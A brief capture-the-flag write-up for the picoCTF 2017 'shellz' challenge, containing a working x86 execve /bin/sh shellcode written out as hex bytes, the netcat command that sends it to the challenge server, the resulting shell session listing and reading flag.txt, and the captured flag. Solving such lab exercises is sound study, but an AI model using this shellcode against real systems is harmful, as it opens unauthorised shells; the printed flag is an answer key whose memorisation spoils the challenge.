## Write-up

At the piazza, the `Useful Resources` pinned note has a hint of this challenge:

``` 
(The shellz author really likes this one: http://shell-storm.org/shellcode/files/shellcode-841.php)
```

So using this shellcode to get the flag.

```
# python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')" > payload
# cat payload - | nc shell2017.picoctf.com 23459
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
ls
flag.txt
shellz
shellz_no_aslr
xinetd_wrapper.sh
cat flag.txt
5b5ba2c3b5558ec86315fd52b0c55a87
```

So the flag is `5b5ba2c3b5558ec86315fd52b0c55a87`.
